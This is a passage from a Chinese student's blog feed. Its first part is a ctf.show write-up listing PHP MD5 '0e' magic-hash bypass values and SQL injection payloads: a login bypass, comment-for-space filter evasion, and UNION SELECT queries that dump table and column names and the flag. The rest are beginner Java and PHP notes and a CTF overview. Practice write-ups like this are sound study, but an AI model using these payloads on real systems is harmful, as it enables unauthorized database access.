href="https://blog.csdn.net/miuzzx/article/details/104321970?spm=1001.2101.3001.6650.7&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7.pc_relevant_antiscanv2&amp;utm_relevant_index=11">https://blog.csdn.net/miuzzx/article/details/104321970?spm=1001.2101.3001.6650.7&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7.pc_relevant_antiscanv2&amp;utm_relevant_index=11</a>))</p><h1 id="5-ctf-show-web5"><a href="#5-ctf-show-web5" class="headerlink" title="5.ctf.show_web5"></a>5.ctf.show_web5</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_alpha</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"v1 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"v2 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"where is flag?"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​                </p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031821505.png"></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031822954.png"></p><p><strong>根据题目的php代码要求：需要传两个参数v1和v2，v1必须为字母，v2必须为数字，如果两者的MD5值相同，输出flag</strong></p><p>涉及了PHP md5()函数</p><blockquote><p>Php为<strong>弱类型</strong>语言<br>Php中的** == <strong>为</strong>弱类型比较**<br>Md5碰撞利用‘<strong>0e</strong>’开头的<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a><br>Php解释器将e解释为 <strong>科学记数法</strong> 分隔<br>因此只要两段明文的md5秘文以0e开头且长度相同</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">常用<span class="token constant">MD5</span>绕过值：字母数字混合类（<span class="token constant">MD5</span>值）：s878926199a<span class="token number">0e545993274517709034328855841020</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s214587387a<span class="token number">0e848240448830537924465865611904</span> 大写字母类：<span class="token constant">QLTHNDT</span><span class="token number">0e405967825401955372549139051580</span> <span class="token constant">QNKCDZO</span><span class="token number">0e830400451993494058024219903391</span> <span class="token constant">EEIZDOI</span><span class="token number">0e782601363539291779881938479162</span> 纯数字类：<span class="token number">240610708</span><span class="token number">0e462097431906509019562988736854</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="6-ctf-show-web6"><a href="#6-ctf-show-web6" class="headerlink" title="6.ctf.show_web6"></a>6.ctf.show_web6</h1><p>尝试万能密码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'or 1=1;#其中#为注释符，语句开头的'</span>不能忽略<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>报错，显示sql inject error</p><p>有字符被过滤</p></blockquote><p>此处使用<u>/**/</u>代替空格</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">'<span class="token comment">/**/</span><span class="token keyword">or</span><span class="token comment">/**/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>登陆成功</p><p>欢迎你，ctfshow    </p></blockquote><p>爆库得到(web2)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">'<span class="token comment">/**/</span>union<span class="token comment">/**/</span>select<span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>欢迎你，web2    </p></blockquote><p>爆表得到(flag,user)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">'<span class="token comment">/**/</span>union<span class="token comment">/**/</span>select<span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">/**/</span>from<span class="token comment">/**/</span>information_schema<span class="token operator">.</span>tables<span class="token comment">/**/</span>where<span class="token comment">/**/</span>table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>欢迎你，flag,user    </p></blockquote><p>爆字段得到(flag字段)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name='</span>flag'<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>欢迎你，flag    </p></blockquote><p>爆字段值得到flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">'<span class="token comment">/**/</span>union<span class="token comment">/**/</span>select<span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">/**/</span>from<span class="token comment">/**/</span>flag<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>欢迎你，ctfshow{f086e8a5-ae06-461f-8124-1371e2dc4987}    </p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CTF_WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java继承与封装学习</title>
      <link href="/2022/03/27/java%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%B0%81%E8%A3%85%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/03/27/java%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%B0%81%E8%A3%85%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、继承"><a href="#一、继承" class="headerlink" title="一、继承"></a>一、继承</h1><h2 id="抽象类-方法：abstract关键字修饰"><a href="#抽象类-方法：abstract关键字修饰" class="headerlink" title="抽象类/方法：abstract关键字修饰"></a>抽象类/方法：abstract关键字修饰</h2><p><a href="https://blog.csdn.net/weixin_40096176/article/details/79094991?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164835079316782089352133%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164835079316782089352133&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-79094991.142%5Ev5%5Epc_search_result_control_group,143%5Ev6%5Econtrol&utm_term=abstract%E5%85%B3%E9%94%AE%E5%AD%97&spm=1018.2226.3001.4187">java关键字abstract(抽象)详解</a></p><p>简单理解下：abstract关键字修饰的类/方法,只能被 继承、覆写/覆写  后才能实例</p><h2 id="上转型对象"><a href="#上转型对象" class="headerlink" title="上转型对象"></a>上转型对象</h2><p>父类 名称 = new 子类()<br><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032054596.png"></p><h2 id="equals和-的区别"><a href="#equals和-的区别" class="headerlink" title="equals和==的区别"></a>equals和==的区别</h2><p><strong>双等号比较的其实是地址值</strong></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032054212.png"></p><p>在编译String s1=“song”的时候其实是jvm在常量池中创建了一个内容为”song”的地址值,然后让s1去指向”song”,而不是把”song”直接赋值给s1;</p><p>在编译String s2=“song”的时候常量池中已经有了”song”的地址值,所以让s2直接指向常量池中的”song”，这样s1和s2的地址值都是常量池中”song”的地址值,所以通过双等号的运算结果是true。</p><p><strong>equals比较的是内容是否相同</strong></p><p>然而在第二种情况下执行String s2=new String(“song”)的时候,要记住每new一次就会出现一个新的对象,所以这种情况是直接在堆内存中开辟了一块新的空间去储存”song”,所以此时s1和s2的地址值是不一样的,自然==的结果就为false。</p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203261825091.png"></p><h1 id="二、private关键字"><a href="#二、private关键字" class="headerlink" title="二、private关键字"></a>二、private关键字</h1><p>父类被子类继承后，其private修饰的属性，只能通过父类的公有方法赋值，也就是说：private修饰属性在构造方法时不必直接赋值，可以在子类继承后通过通过public方法进项赋值</p><h1 id="三、’类’-型的数组"><a href="#三、’类’-型的数组" class="headerlink" title="三、’类’  型的数组"></a>三、’类’  型的数组</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Team</span> <span class="token punctuation">&#123;</span><span class="token comment">// 每次调用表示组队增加一个成员</span> <span class="token class-name">Role</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> mber <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Role</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token class-name">Mber</span> <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//角色上限为6人</span> <span class="token keyword">int</span> sumAttack<span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addMember</span><span class="token punctuation">(</span><span class="token class-name">Role</span> role<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Mber</span><span class="token operator">&lt;=</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>mber<span class="token punctuation">[</span><span class="token class-name">Mber</span><span class="token punctuation">]</span> <span class="token operator">=</span> role<span class="token punctuation">;</span><span class="token class-name">Mber</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"组队人数超过上限"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">attackSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token class-name">Mber</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sumAttack <span class="token operator">+=</span> mber<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> sumAttack<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><center>此类数组赋值时，方法中向数组传参的值为父类或子类的实例化对象</center>]]></content>
      
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CtfhubDay1</title>
      <link href="/2022/03/24/CtfhubDay1/"/>
      <url>/2022/03/24/CtfhubDay1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTF基础知识"><a href="#CTF基础知识" class="headerlink" title="CTF基础知识"></a>CTF基础知识</h1><h2 id="比赛形式"><a href="#比赛形式" class="headerlink" title="比赛形式"></a>比赛形式</h2><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>CTF比赛一般分为线上赛和线下赛。通常来说，线上赛多为<code>初赛</code>, 线下赛多为<code>决赛</code>, 但是也不排除直接进行</p><h3 id="线上"><a href="#线上" class="headerlink" title="线上"></a>线上</h3><p>选手通过主办方搭建的比赛平台在线注册，在线做题并提交flag，线上比赛多为解题模式，攻防模式较为少见。通常来说对于长时间未解出的题目，主办方会酌情给出提示(<code>Hint</code>)来帮助选手做题。</p><h3 id="线下"><a href="#线下" class="headerlink" title="线下"></a>线下</h3><p>选手前往比赛所在地，现场接入比赛网络进行比赛，线下多为AWD模式，近年来随着比赛赛制的不断革新，线下赛也会出现多种模式混合进行，例如结合<strong>解题+AWD</strong> ，<strong>解题+RW</strong> 等等   </p><h2 id="题目类型"><a href="#题目类型" class="headerlink" title="题目类型"></a>题目类型</h2><h2 id="正文-1"><a href="#正文-1" class="headerlink" title="正文"></a>正文</h2><p>在CTF中主要包含以下5个大类的题目，有些比赛会根据自己的侧重点单独添加某个分类，例如<code>移动设备(Mobile)</code>, <code>电子取证(Forensics)</code>等，近年来也会出来混合类型的题目，例如在Web中存在一个二进制程序，需要选手先利用Web的漏洞获取到二进制程序，之后通过逆向或是Pwn等方式获得最终flag</p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>Web类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如<code>SQL注入</code>、<code>XSS</code>、<code>代码执行</code>、<code>代码审计</code>等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件</p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><p>Pwn类题目重点考察选手对于<code>二进制漏洞的挖掘和利用</code>能力，其考点也通常在<code>堆栈溢出</code>、<code>格式化漏洞</code>、<code>UAF</code>、<code>Double Free</code>等常见二进制漏洞上。选手需要根据题目中给出的二进制可执行文件进行逆向分析，找出其中的漏洞并进行利用，编写对应的漏洞攻击脚本(<code>Exploit</code>)，进而对主办方给出的远程服务器进行攻击并获取flag通常来说Pwn类题目给出的远程服务器信息为<code>nc IP_ADDRESS PORT</code>，例如<code>nc 1.2.3.4 4567</code>这种形式，表示在<code>1.2.3.4</code>这个IP的<code>4567</code>端口上运行了该题目</p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>Re类题目考察选手<code>逆向工程</code>能力。题目会给出一个可执行二进制文件，有些时候也可能是Android的APK安装包。选手需要逆向给出的程序，分析其程序工作原理。最终根据程序行为等获得flag</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p>Crypto类题目考察选手对<code>密码学</code>相关知识的了解程度，诸如<code>RSA</code>、<code>AES</code>、<code>DES</code>等都是密码学题目的常客。有些时候也会给出一个加密脚本和密文，根据加密流程逆推出明文。</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><p>Misc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag</p><p>常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF_WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习笔记2</title>
      <link href="/2022/03/23/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/"/>
      <url>/2022/03/23/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第三章-流程控制"><a href="#第三章-流程控制" class="headerlink" title="第三章_ 流程控制"></a>第三章_ 流程控制</h1>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习笔记1</title>
      <link href="/2022/03/17/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/03/17/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PHP第一节简单介绍"><a href="#PHP第一节简单介绍" class="headerlink" title="PHP第一节简单介绍"></a>PHP第一节简单介绍</h1><p>动态页面：网络信息随时间更新</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032054153.png"></p><p>5.<img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032054929.png"></p><h3 id="web服务器介绍"><a href="#web服务器介绍" class="headerlink" title="web服务器介绍"></a>web服务器介绍</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032054813.png"></p><p>1)url地址</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032054699.png"></p><p>2)dns介绍：</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032054532.png"></p><h2 id="PHP第二节"><a href="#PHP第二节" class="headerlink" title="PHP第二节"></a>PHP第二节</h2><p>1.localhost、127.0.0.1默认访问的都是站点根目录</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032055381.png"></p><p>如果没有index.(php)文件，那么就会将文件夹中的文件目录列出来</p><p>apache配置的（www目录为根目录）</p><h2 id="PHP第三节"><a href="#PHP第三节" class="headerlink" title="PHP第三节"></a>PHP第三节</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032054274.png"></p><p>1.不是PHP文件末尾的’?&gt; ‘不可以省略！！</p><p>2.指令分隔符”;”</p><p>3.解释：</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032055474.png"></p><p>html文件中不能嵌入php文件，apache服务器默认不会扫描PHP应用服务器（当然可以设置去扫描）</p><p>4.</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032055247.png"></p><h2 id="PHP第四节"><a href="#PHP第四节" class="headerlink" title="PHP第四节"></a>PHP第四节</h2><h3 id="1-变量"><a href="#1-变量" class="headerlink" title="1.变量"></a>1.变量</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032055849.png"></p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032055098.png" style="zoom:67%;" /><h3 id="笔记："><a href="#笔记：" class="headerlink" title="笔记："></a>笔记：</h3><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032055731.png" style="zoom:50%;" /><p>2.<img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032055700.png" style="zoom:50%;" /></p><h3 id="PHP关键字："><a href="#PHP关键字：" class="headerlink" title="PHP关键字："></a>PHP关键字：</h3><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032055456.png" style="zoom:50%;" /><h3 id="变量销毁"><a href="#变量销毁" class="headerlink" title="变量销毁"></a>变量销毁</h3><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032055118.png" style="zoom:50%;" /><h3 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h3><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032055935.png" style="zoom:50%;" /><h3 id="变量的引用赋值"><a href="#变量的引用赋值" class="headerlink" title="变量的引用赋值"></a>变量的引用赋值</h3><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032055932.png" style="zoom:50%;" /><blockquote><p>&amp;的解释</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032056075.png"></p><h2 id="PHP第五节"><a href="#PHP第五节" class="headerlink" title="PHP第五节"></a>PHP第五节</h2><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032056316.png" style="zoom:50%;" /><h3 id="变量类型简介"><a href="#变量类型简介" class="headerlink" title="变量类型简介"></a>变量类型简介</h3><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032056971.png" alt="image-20220317182744472" style="zoom:50%;" /><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a&#x3D;true;$b&#x3D;1;echo $a;var_dump($b);&#x2F;&#x2F;同时输出数据类型?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="字符串类型介绍（单引号与双引号）"><a href="#字符串类型介绍（单引号与双引号）" class="headerlink" title="字符串类型介绍（单引号与双引号）"></a>字符串类型介绍（单引号与双引号）</h3><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032056489.png" style="zoom:50%;" /><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token number">999</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'test$abcd'</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token string double-quoted-string">"test<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$b</span><span class="token punctuation">&#125;</span></span>asdf"</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token string single-quoted-string">'test&#123;$b&#125;sadf'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//可见只有""中使用&#123;&#125;将变量包裹才可以输出变量  //输出语句中要用多个引号时，需要用反斜杠\（转义字符）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032056795.png"></p><h3 id="4）定界符-lt-lt-lt"><a href="#4）定界符-lt-lt-lt" class="headerlink" title="4）定界符&lt;&lt;&lt;"></a>4）定界符&lt;&lt;&lt;</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php$m&#x3D;1988;$a&#x3D;&lt;&lt;&lt;bbb啥地&#39;;&#39;方;&#39;&#39;&#39;就&#123;$m&#125;开始&quot;fgh&quot;打sddsadfbbb;var_dump($a);?&gt;&#x2F;&#x2F;可以使用&#123;&#125;插入变量输出&#x2F;&#x2F;还可以包含单双引号，当做普通字符输出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032056393.png"></p><h3 id="5）数组"><a href="#5）数组" class="headerlink" title="5）数组"></a>5）数组</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032056153.png"></p><p>以后再讲</p><h3 id="6）object（对象）"><a href="#6）object（对象）" class="headerlink" title="6）object（对象）"></a>6）object（对象）</h3><p>以后再讲</p><h3 id="7）resource（资源）"><a href="#7）resource（资源）" class="headerlink" title="7）resource（资源）"></a>7）resource（资源）</h3><p>以后再讲</p><h3 id="8）NULL"><a href="#8）NULL" class="headerlink" title="8）NULL"></a>8）NULL</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032056351.png"></p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a;var_dump($a);?&gt;&#x2F;&#x2F;未定义、未赋值、值为NULL的(大小写都可以) 变量值 都是NULL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032056516.png"></p><h3 id="9）unset-变量销毁"><a href="#9）unset-变量销毁" class="headerlink" title="9）unset();变量销毁"></a>9）unset();变量销毁</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a;unset($a);var_dump($a);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032056131.png"></p><h2 id="变量类型相互转换"><a href="#变量类型相互转换" class="headerlink" title="变量类型相互转换"></a>变量类型相互转换</h2><h3 id="1）自动类型转换"><a href="#1）自动类型转换" class="headerlink" title="1）自动类型转换"></a>1）自动类型转换</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032056123.png"></p><p>举例</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a&#x3D;&quot;猫&quot;;var_dump($a);$a+&#x3D;1;var_dump($a);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032056163.png"></p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a&#x3D;&quot;猫&quot;;echo &#39;&lt;br&#x2F;&gt;&#39;;$b&#x3D;(int)$a;var_dump($b);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032056339.png"></p><h3 id="2）强制类型转换"><a href="#2）强制类型转换" class="headerlink" title="2）强制类型转换"></a>2）强制类型转换</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032056106.png" alt="image-20220317200833439"></p><h2 id="变量类型的测试函数"><a href="#变量类型的测试函数" class="headerlink" title="变量类型的测试函数"></a>变量类型的测试函数</h2><p><img 